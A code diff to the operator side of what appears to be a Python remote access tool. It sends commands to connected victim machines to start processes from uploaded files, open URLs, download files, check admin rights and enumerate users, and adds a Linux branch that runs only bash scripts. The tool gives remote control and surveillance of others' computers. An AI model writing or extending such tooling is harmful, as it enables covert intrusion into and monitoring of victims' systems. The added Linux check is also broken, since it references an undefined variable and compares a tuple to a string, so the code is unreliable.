@@ -156,8 +156,16 @@ def open_url(client):
     print()
 
 
-def start_process(client):
-    path_dir = input("Enter file directory : ")
+def start_process(client, Id):
+    if 'Linux' in g.active_conns[Id][2]:
+        print("Client is running linux")
+        print("Only bash(.sh) files are supported\n")
+        path_dir = input("Enter file directory : ")
+        if os.path.splitext(path) != '.sh':
+            print("Specified file is not a bash(.sh) file")
+            return
+    else:
+        path_dir = input("Enter file directory : ")
     client.send(path_dir.encode())
     msg = (client.recv(5120)).decode()
     print()
@@ -180,7 +188,7 @@ def check_admin(client):
 
 
 def list_users(client):
-    users = client.recv(5120).decode()
+    users = client.recv(10240).decode()
     print()
     print(users)
     print()
@@ -312,10 +320,10 @@ def send_command(client, Id):
             elif command == 'cwd':
                 client.send(command.encode())
                 get_cwd(client=client)
-            elif command == 'ls_cwd':
+            elif command == 'ls -cwd':
                 client.send(command.encode())
                 list_cwd(client=client)
-            elif command == 'ls_dir':
+            elif command == 'ls -dir':
                 client.send(command.encode())
                 list_dir(client=client)
             elif command == 'dwnld':
@@ -338,14 +346,14 @@ def send_command(client, Id):
                 open_url(client=client)
             elif command == 'strt_proc':
                 client.send(command.encode())
-                start_process(client=client)
+                start_process(client=client, Id=Id)
             elif command == 'curr_usr':
                 client.send(command.encode())
                 current_user(client=client)
             elif command == 'chk_admin':
                 client.send(command.encode())
                 check_admin(client=client)
-            elif command == 'lst_usrs':
+            elif command == 'ls -usrs':
                 client.send(command.encode())
                 list_users(client=client)
             elif command == 'curr_usr_details':
